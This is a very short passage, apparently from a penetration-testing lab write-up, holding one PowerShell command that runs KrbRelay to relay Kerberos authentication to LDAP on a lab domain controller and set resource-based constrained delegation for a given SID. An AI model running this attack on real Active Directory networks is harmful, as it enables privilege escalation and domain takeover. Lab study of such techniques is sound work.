...
```powershell
.\KrbRelay.exe -spn ldap/winterfell.north.sevenkingdoms.local -clsid f8842f8e-dafe-4b37-9d38-4e0714a61149 -rbcd S-1-5-21-585350295-1285882793-2068218167-5103 -port 443
```
